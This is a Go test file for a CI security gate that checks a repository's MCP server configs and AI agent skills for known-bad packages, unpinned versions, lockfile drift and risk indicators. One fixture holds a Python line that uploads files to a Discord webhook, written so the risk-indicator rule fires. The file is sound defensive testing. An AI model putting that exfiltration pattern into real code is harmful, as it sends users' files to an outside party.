package ci

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/MC-kakadu/AIexpose/internal/policy"
)

// repo builds a throwaway repository on disk.
func repo(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for rel, body := range files {
		path := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// shippedRules is the signed rule file a CI job would install or commit.
// The default build embeds none, so every test that exercises a rule has to
// point at them explicitly -- exactly as a real job does.
const shippedRules = "../feed/data/feed.json"

const cleanRepo = `{"mcpServers":{"fs":{"command":"npx","args":["-y","@modelcontextprotocol/server-filesystem@2026.8.1","./data"]}}}`

func rules(res Result) map[policy.Rule]int {
	m := map[policy.Rule]int{}
	for _, v := range res.Violations {
		if v.Exempted == nil {
			m[v.Rule]++
		}
	}
	return m
}

// A gate that cannot load its rules must not report success.
func TestMissingRulesFailTheGate(t *testing.T) {
	dir := repo(t, map[string]string{".mcp.json": cleanRepo})
	res, err := Run(Options{Dir: dir, FeedPath: filepath.Join(t.TempDir(), "absent.json")})
	if err != nil {
		t.Fatal(err)
	}
	if !res.Failed() {
		t.Fatal("a gate with no detection rules reported success")
	}
	if len(res.Violations) == 0 || res.Violations[0].Component != "aiexpose" {
		t.Fatalf("expected a violation about the rules themselves, got %+v", res.Violations)
	}
}

// --no-feed is an explicit choice, so it must not manufacture a failure.
func TestNoFeedIsNotTreatedAsMissingRules(t *testing.T) {
	dir := repo(t, map[string]string{".mcp.json": cleanRepo})
	res, err := Run(Options{Dir: dir, NoFeed: true, WriteLock: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.Failed() {
		t.Fatalf("--no-feed must not fail the gate on its own: %+v", res.Violations)
	}
}

func TestCleanRepositoryPasses(t *testing.T) {
	dir := repo(t, map[string]string{".mcp.json": cleanRepo})
	res, err := Run(Options{Dir: dir, FeedPath: shippedRules, WriteLock: true})
	if err != nil {
		t.Fatal(err)
	}
	if res.Failed() {
		t.Fatalf("a pinned, known-good repository must pass: %+v", res.Violations)
	}
	if res.Components != 1 {
		t.Errorf("components = %d, want 1", res.Components)
	}
}

func TestKnownBadPackageFailsTheGate(t *testing.T) {
	dir := repo(t, map[string]string{
		".mcp.json": `{"mcpServers":{"pm":{"command":"npx","args":["-y","postmark-mcp@1.0.16"]}}}`,
	})
	res, err := Run(Options{Dir: dir, FeedPath: shippedRules})
	if err != nil {
		t.Fatal(err)
	}
	if !res.Failed() {
		t.Fatal("a package on the known-bad list must fail the gate")
	}
	if rules(res)[policy.KnownBad] != 1 {
		t.Errorf("known_bad violations = %d, want 1", rules(res)[policy.KnownBad])
	}
}

func TestUnpinnedIsAWarningByDefault(t *testing.T) {
	dir := repo(t, map[string]string{
		".mcp.json": `{"mcpServers":{"w":{"command":"npx","args":["-y","weather-mcp"]}}}`,
	})
	res, err := Run(Options{Dir: dir, FeedPath: shippedRules})
	if err != nil {
		t.Fatal(err)
	}
	if res.Failed() {
		t.Error("an unpinned package should warn, not fail, under the defaults")
	}
	if rules(res)[policy.UnpinnedPackage] != 1 {
		t.Error("the unpinned package was not reported at all")
	}
}

func TestLockDriftAndUnlockedComponents(t *testing.T) {
	dir := repo(t, map[string]string{
		".mcp.json":                      cleanRepo,
		".claude/skills/helper/SKILL.md": "# helper\nrun the thing\n",
	})
	if _, err := Run(Options{Dir: dir, FeedPath: shippedRules, WriteLock: true}); err != nil {
		t.Fatal(err)
	}

	// A pull request edits a reviewed skill and adds an unreviewed one.
	if err := os.WriteFile(filepath.Join(dir, ".claude/skills/helper/SKILL.md"),
		[]byte("# helper\nrun something else\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, ".claude/skills/newcomer"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".claude/skills/newcomer/SKILL.md"),
		[]byte("# newcomer\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	res, err := Run(Options{Dir: dir, FeedPath: shippedRules})
	if err != nil {
		t.Fatal(err)
	}
	got := rules(res)
	if got[policy.LockDrift] != 1 {
		t.Errorf("lock_drift = %d, want 1", got[policy.LockDrift])
	}
	if got[policy.Unlocked] != 1 {
		t.Errorf("unlocked_component = %d, want 1", got[policy.Unlocked])
	}
	if !res.Failed() {
		t.Error("drift in a reviewed component must fail the gate")
	}
}

func TestExemptionKeepsTheGateGreenButStaysVisible(t *testing.T) {
	dir := repo(t, map[string]string{
		".mcp.json": `{"mcpServers":{"w":{"command":"npx","args":["-y","weather-mcp"]}}}`,
		policy.FileName: `{"version":1,
			"rules":{"unpinned_package":"error"},
			"exemptions":[{"rule":"unpinned_package","match":{"component":"w"},"reason":"mirrored internally"}]}`,
	})
	res, err := Run(Options{Dir: dir, FeedPath: shippedRules})
	if err != nil {
		t.Fatal(err)
	}
	if res.Failed() {
		t.Error("an exempted violation must not fail the gate")
	}
	if len(res.Violations) != 1 || res.Violations[0].Exempted == nil {
		t.Fatalf("the waived violation must still be reported: %+v", res.Violations)
	}
	if _, _, waived := res.Counts(); waived != 1 {
		t.Errorf("waived count = %d, want 1", waived)
	}
}

func TestRiskIndicatorsInRepositoryFiles(t *testing.T) {
	dir := repo(t, map[string]string{
		"custom_nodes/thing/__init__.py": "import requests\n" +
			`requests.post("https://discord.com/api/webhooks/1/x", files={"f": b})` + "\n",
	})
	res, err := Run(Options{Dir: dir, FeedPath: shippedRules})
	if err != nil {
		t.Fatal(err)
	}
	if rules(res)[policy.RiskIndicator] != 1 {
		t.Fatalf("risk_indicator = %d, want 1: %+v", rules(res)[policy.RiskIndicator], res.Violations)
	}
	// Paths must be repository-relative so a lockfile and SARIF output are
	// identical on every machine and in every CI runner.
	for _, v := range res.Violations {
		if filepath.IsAbs(v.Path) {
			t.Errorf("violation path %q is absolute", v.Path)
		}
	}
}

func TestLockfileIsStableAcrossRuns(t *testing.T) {
	dir := repo(t, map[string]string{".mcp.json": cleanRepo})
	read := func() []policy.LockedComponent {
		l, err := policy.LoadLock(filepath.Join(dir, policy.LockFileName))
		if err != nil {
			t.Fatal(err)
		}
		return l.Components
	}
	if _, err := Run(Options{Dir: dir, FeedPath: shippedRules, WriteLock: true}); err != nil {
		t.Fatal(err)
	}
	first := read()
	if _, err := Run(Options{Dir: dir, FeedPath: shippedRules, WriteLock: true}); err != nil {
		t.Fatal(err)
	}
	a, _ := json.Marshal(first)
	b, _ := json.Marshal(read())
	if string(a) != string(b) {
		t.Error("the lockfile changed between identical runs, which would churn every diff")
	}
}
